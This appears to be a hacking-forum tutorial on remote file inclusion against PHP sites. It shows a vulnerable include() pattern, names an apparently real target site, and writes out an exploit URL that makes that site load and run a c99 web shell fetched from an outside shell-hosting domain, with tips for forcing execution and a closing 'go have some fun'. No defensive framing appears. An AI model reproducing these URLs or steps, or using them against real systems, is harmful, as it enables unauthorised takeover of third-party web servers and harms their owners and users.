OK, so part one,
a website is built of code but sometime people get extremely lazy or they are just very new to website design and dont know what there doing, when they make the website they usually include the code,

$page = $_GET['page'];
> include("".$page.".html");_

When the page loads it usually blindely includes anything that is injected into ("".$page.".html"); this is good for us that means we can inject a remote file.

PART 2. so now google around or look for a rfi vulnerable website here is an example of one
[URL](URL.md)http://artmoment.de//pixlie/pixlie.php?root[/URL]=
see where it says root= this is where you upload your shell you can either upload one on to a website or use it or you can just use some of these,


[URL="http://www.hackerlar.net/"]www.hackerlar.net[/URL]
so now that you have your shells you wanna add them to the end of the url it should look somethin like this

[URL="http://artmoment.de//pixlie/pixlie.php?root=http://hackerlar.net/c99.txt"]http://artmoment.de//pixlie/pixlie.p...ar.net/c99.txt[/URL]


so now make sure you add a question mark at the end of the url so it looks like this
[URL](URL.md)http://artmoment.de//pixlie/pixlie.php?root[/URL][URL="http://artmoment.de//pixlie/pixlie.php?root"]=[/URL][URL="http://www.hackerlar.net/c99.txt"] - c99shell[/URL]?

This will force it to run the shell so that you can go have some fun!

Max Credits to Casi!